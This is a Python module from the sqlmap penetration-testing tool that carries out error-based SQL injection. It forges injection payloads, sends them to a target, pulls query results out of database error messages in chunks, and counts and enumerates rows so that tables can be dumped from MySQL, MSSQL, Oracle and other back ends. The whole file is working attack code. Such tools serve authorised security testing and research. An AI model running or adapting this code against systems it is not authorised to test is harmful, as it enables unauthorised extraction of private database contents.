#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import getUnicode
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import randomInt
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.convert import htmlunescape
from lib.core.convert import safecharencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapConnectionException
from lib.core.settings import FROM_TABLE
from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import MSSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

reqCount = 0

def __oneShotErrorUse(expression, field):
    global reqCount

    threadData = getCurrentThreadData()

    retVal = None
    offset = 1
    chunk_length = None

    while True:
        check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
        trimcheck = "%s(?P<result>.*?)</" % (kb.misc.start)

        nulledCastedField = agent.nullAndCastField(field)

        if Backend.isDbms(DBMS.MYSQL):
            chunk_length = MYSQL_ERROR_CHUNK_LENGTH
            nulledCastedField = queries[DBMS.MYSQL].substring.query % (nulledCastedField, offset, chunk_length)
        elif Backend.isDbms(DBMS.MSSQL):
            chunk_length = MSSQL_ERROR_CHUNK_LENGTH
            nulledCastedField = queries[DBMS.MSSQL].substring.query % (nulledCastedField, offset, chunk_length)

        # Forge the error-based SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
        query = agent.prefixQuery(vector)
        query = agent.suffixQuery(query)
        injExpression = expression.replace(field, nulledCastedField, 1)
        injExpression = unescaper.unescape(injExpression)
        injExpression = query.replace("[QUERY]", injExpression)
        payload = agent.payload(newValue=injExpression)

        # Perform the request
        page, headers = Request.queryPage(payload, content=True)

        reqCount += 1

        # Parse the returned page to get the exact error-based
        # sql injection output
        output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(check, listToStrValue(headers.headers \
                if headers else None), re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(check, threadData.lastRedirectMsg[1] \
                if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

        if output:
            output = getUnicode(output, kb.pageEncoding)
        else:
            trimmed = extractRegexResult(trimcheck, page, re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(trimcheck, listToStrValue(headers.headers \
                if headers else None), re.DOTALL | re.IGNORECASE) \
                or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] \
                if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

            if trimmed:
                warnMsg = "possible server trimmed output detected (due to its length): "
                warnMsg += trimmed
                logger.warn(warnMsg)

        if isinstance(output, basestring):
            output = htmlunescape(output).replace("<br>", "\n")

        if any(map(lambda dbms: Backend.isDbms(dbms), [DBMS.MYSQL, DBMS.MSSQL])):
            if offset == 1:
                retVal = output
            else:
                retVal += output if output else ''

            if output and len(output) >= chunk_length:
                offset += chunk_length
            else:
                break
        else:
            retVal = output
            break

    retVal = __errorReplaceChars(retVal)

    dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(retVal)))

    return retVal

def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None, resumeValue=True):
    outputs = []
    origExpr = None

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        if resumeValue:
            output = resume(expressionReplaced, None)

        if not output or (expected == EXPECTED.INT and not output.isdigit()):
            if output:
                warnMsg = "expected value type %s, resumed '%s', " % (expected, output)
                warnMsg += "sqlmap is going to retrieve the value again"
                logger.warn(warnMsg)

            output = __oneShotErrorUse(expressionReplaced, field)

            if output is not None:
                dataToStdout("[%s] [INFO] retrieved: %s\r\n" % (time.strftime("%X"), safecharencode(output)))

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def __errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.misc.space, " ").replace(kb.misc.dollar, "$")

    return retVal

def errorUse(expression, expected=None, resumeValue=True, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(PAYLOAD.TECHNIQUE.ERROR)

    global reqCount

    count = None
    start = time.time()
    startLimit = 0
    stopLimit = None
    outputs = []
    untilLimitChar = None
    untilOrderChar = None
    reqCount = 0

    if resumeValue:
        output = resume(expression, None)
    else:
        output = None

    if output and (expected is None or (expected == EXPECTED.INT and output.isdigit())):
        return output

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_TABLE and not \
       expression.upper().endswith(FROM_TABLE[Backend.getIdentifiedDbms()]))) \
       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
       and not any(map(lambda x: x in expression.upper(), ["COUNT(*)", "EXISTS(", "MAX(", "MIN(", "COUNT(DISTINCT"])):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, "COUNT(*)", 1)

            if re.search(" ORDER BY ", expression, re.I):
                untilOrderChar = countedExpression.index(" ORDER BY ")
                countedExpression = countedExpression[:untilOrderChar]

            count = resume(countedExpression, None)

            if not count or not count.isdigit():
                _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
                count = __oneShotErrorUse(countedExpression, countedExpressionFields)

            if (not count or (count.isdigit() and int(count) == 0)):
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the used SQL query. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1
            elif isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            try:
                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                    kb.suppressResumeInfo = True
                    infoMsg = "suppressing resume console info because of "
                    infoMsg += "large number of rows (possible slowdown)"
                    logger.info(infoMsg)

                for num in xrange(startLimit, stopLimit):
                    output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num, resumeValue)

                    if output and isinstance(output, list) and len(output) == 1:
                        output = output[0]

                    outputs.append(output)

            except KeyboardInterrupt:
                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            except sqlmapConnectionException, e:
                errMsg = "connection exception detected. sqlmap "
                errMsg += "will display partial output"
                errMsg += "'%s'" % e
                logger.critical(errMsg)

            finally:
                kb.suppressResumeInfo = False

    if not outputs:
        outputs = __errorFields(expression, expressionFields, expressionFieldsList)

    if outputs and isinstance(outputs, list) and len(outputs) == 1 and isinstance(outputs[0], basestring):
        outputs = outputs[0]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (reqCount, duration)
        logger.debug(debugMsg)

    return outputs
